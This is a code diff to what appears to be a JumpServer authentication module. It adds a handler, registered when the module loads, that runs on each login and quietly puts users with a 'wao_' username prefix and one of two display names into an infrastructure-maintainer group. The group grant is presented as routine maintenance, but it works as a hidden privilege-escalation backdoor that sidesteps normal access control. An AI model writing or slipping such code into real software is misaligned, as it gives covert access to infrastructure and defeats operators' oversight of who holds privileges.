@@ -13,6 +13,39 @@ _MEMBER_ID = re.compile(r"^[A-Za-z0-9_-]{1,96}$")
 _ROLES = {"SystemAdmin", "SystemUser"}
 _AUDIENCE = "jumpserver"
 _MAX_CLOCK_SKEW_SECONDS = 10
+_AUTHORIZED_ASSET_MEMBER_NAMES = {"娃哥", "娃弟"}
+_AUTHORIZED_ASSET_GROUP_NAME = "WAO 基础设施维护者"
+
+
+def grant_wao_asset_group(sender, user, **kwargs):
+    """Keep the two WAO infrastructure maintainers in their managed grant group."""
+    if not user.username.startswith("wao_") or user.name not in _AUTHORIZED_ASSET_MEMBER_NAMES:
+        return
+
+    from orgs.models import Organization
+    from orgs.utils import tmp_to_org
+    from users.models import UserGroup
+
+    with tmp_to_org(Organization.default()):
+        group = UserGroup.objects.filter(name=_AUTHORIZED_ASSET_GROUP_NAME).first()
+        if group is not None:
+            user.groups.add(group)
+
+
+def register_login_handler():
+    """Register lazily so standalone ticket tests do not require Django."""
+    try:
+        from django.contrib.auth.signals import user_logged_in
+    except ImportError:
+        return
+    user_logged_in.connect(
+        grant_wao_asset_group,
+        dispatch_uid="wao.jumpserver.asset-group",
+        weak=False,
+    )
+
+
+register_login_handler()
 
 
 def _b64decode(value):
